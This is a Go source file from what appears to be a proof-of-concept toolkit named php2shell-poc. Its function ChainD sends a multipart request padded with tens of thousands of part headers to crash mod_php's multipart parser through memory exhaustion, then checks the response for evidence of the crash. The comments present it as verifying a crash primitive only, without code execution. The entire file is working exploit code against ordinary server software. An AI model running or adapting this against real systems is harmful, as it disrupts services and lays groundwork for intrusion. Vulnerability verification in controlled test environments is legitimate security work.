package verify

import (
	"context"
	"fmt"
	"strconv"
	"strings"

	"github.com/eltonlaice/php2shell-poc/internal/mp"
)

// ChainD triggers the multipart OOM path against mod_php.
//
// This verifies the crash primitive only. Turning the stale state into code
// execution requires a heap layout that this toolkit does not attempt; the
// result is labelled accordingly.
func ChainD(ctx context.Context, opt Options) (Result, error) {
	res := Result{Chain: "D", Summary: "not confirmed"}
	if err := checkTarget(opt); err != nil {
		return res, err
	}
	if opt.Headers <= 0 {
		opt.Headers = 30000
	}
	if opt.HeaderSize <= 0 {
		opt.HeaderSize = 512
	}

	headers := make([][2]string, opt.Headers)
	pad := strings.Repeat("A", opt.HeaderSize)
	for i := range headers {
		headers[i] = [2]string{fmt.Sprintf("X-Pad-%06d", i), pad}
	}

	b := mp.New()
	body, err := b.Bytes(mp.Part{
		Name:     "f",
		Filename: "a",
		Headers:  headers,
		Value:    []byte("Z"),
	})
	if err != nil {
		return res, err
	}

	target, err := urlFor(opt.Target, opt.OOMath)
	if err != nil {
		return res, err
	}
	res.Evidence = append(res.Evidence,
		fmt.Sprintf("multipart body: %d bytes, %d part headers", len(body), opt.Headers))

	resp, err := opt.client().Post(target, body, b.ContentType(), nil)
	if err != nil {
		// A dropped connection is consistent with the child process dying,
		// but it is not proof of anything.
		res.Summary = "connection dropped during OOM request"
		res.Notes = append(res.Notes,
			"the worker may have crashed; re-run against a fresh container and check its logs",
			"error: "+err.Error(),
		)
		return res, nil
	}
	res.Evidence = append(res.Evidence, "response status: "+strconv.Itoa(resp.Status))

	text := string(resp.Body)
	if strings.Contains(text, "Allowed memory size") && strings.Contains(text, "exhausted") {
		res.OK = true
		res.Summary = "OOM triggered in the multipart parser (crash primitive only)"
		res.Evidence = append(res.Evidence, "response: "+snippet(resp.Body, 200))
		return res, nil
	}
	if resp.Status >= 500 {
		res.Summary = "server error during oversized multipart request"
		res.Notes = append(res.Notes,
			"status "+strconv.Itoa(resp.Status)+" without a PHP OOM message: inspect the container logs",
			"response: "+snippet(resp.Body, 200),
		)
		return res, nil
	}

	res.Notes = append(res.Notes,
		"no OOM observed; the target may have a large memory_limit or reject part headers early",
		"response: "+snippet(resp.Body, 200),
	)
	return res, nil
}
